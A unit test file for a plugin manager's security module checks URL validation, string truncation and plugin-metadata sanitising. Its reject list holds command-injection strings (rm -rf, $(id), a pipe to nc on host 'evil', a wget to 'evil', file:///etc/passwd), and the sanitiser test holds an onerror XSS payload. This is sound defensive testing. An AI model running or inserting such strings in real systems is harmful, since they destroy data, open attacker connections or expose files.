// Unit tests for security.mjs — run with: qml6 tests/run.qml
// Plain QML JS (V4), no imports beyond the module under test.
import * as Sec from "../security.mjs"

export function runAll() {
  var fails = 0
  function check(name, actual, expected) {
    var ok = (typeof expected === "boolean") ? (actual === expected)
      : (JSON.stringify(actual) === JSON.stringify(expected))
    if (!ok) {
      fails++
      console.log("FAIL", name, "\n     got:", JSON.stringify(actual), "\n    want:", JSON.stringify(expected))
    } else console.log("ok  ", name)
  }

  // ---- isSafeSourceUrl ----
  var goodUrls = [
    "https://github.com/stappmus/omarchy-activity-monitor.git",
    "https://github.com/a/b",
    "https://gitlab.com/x/y.git",
  ]
  var badUrls = [
    "http://github.com/a/b",
    "https://github.com/a/b;rm -rf ~",
    "https://github.com/a/b$(id)",
    "https://github.com/a/b`id`",
    "https://github.com/$(id)",
    "https://github.com/a/b | nc evil 4444",
    "https://github.com/a/b\tx",
    "https://github.com/a/b\nwget http://evil",
    "ssh://github.com/a",
    "file:///etc/passwd",
    "file:///etc/passwd; rm",
    "",
    "javascript:alert(1)",
    "https://" + "a".repeat(250),
  ]
  for (var i = 0; i < goodUrls.length; i++)
    check("url accept " + goodUrls[i], Sec.isSafeSourceUrl(goodUrls[i]), true)
  for (i = 0; i < badUrls.length; i++)
    check("url reject " + JSON.stringify(badUrls[i]).substring(0, 60), Sec.isSafeSourceUrl(badUrls[i]), false)

  // ---- boundString ----
  check("bound truncates to cap+ellipsis", Sec.boundString("x".repeat(400), 256).length, 257)
  check("bound last char is ellipsis", Sec.boundString("x".repeat(400), 256).charAt(256), "…")
  check("bound passes short string", Sec.boundString("hello", 256), "hello")
  check("bound null -> empty", Sec.boundString(null, 256), "")
  check("bound undefined -> empty", Sec.boundString(undefined, 256), "")

  // ---- sanitizePlugins ----
  var evil = [{
    id: "x", name: "<b>bold</b>", description: "<img src=x onerror=alert(1)>",
    author: "a".repeat(1000), version: "9" + "y".repeat(200),
    kinds: ["panel", "bar-widget", "k3", "k4", "k5", "k6", "k7", "k8", "k9", "k10"],
    enabled: true, firstParty: false, clonedFrom: null
  }, null, "junk", 42]

  var s = Sec.sanitizePlugins(evil, 512, 256)
  check("sanitize drops non-object entries", s.length, 1)
  check("sanitize keeps name verbatim (PlainText renders it inert)", s[0].name, "<b>bold</b>")
  check("sanitize caps author at 257", s[0].author.length, 257)
  check("sanitize caps version at 65", s[0].version.length, 65)
  check("sanitize caps kinds array to 8 max", s[0].kinds.length, 8)
  check("sanitize description verbatim", s[0].description, "<img src=x onerror=alert(1)>")
  check("sanitize enabled true", s[0].enabled, true)

  var big = []
  for (i = 0; i < 600; i++) big.push({ id: "p" + i, name: "p" + i })
  check("sanitize caps items at 512", Sec.sanitizePlugins(big, 512, 256).length, 512)

  check("sanitize string input -> []", Sec.sanitizePlugins("[]", 512, 256).length, 0)
  check("sanitize null -> []", Sec.sanitizePlugins(null, 512, 256).length, 0)

  console.log(fails === 0 ? "ALL PASS" : fails + " FAILURES")
  return fails
}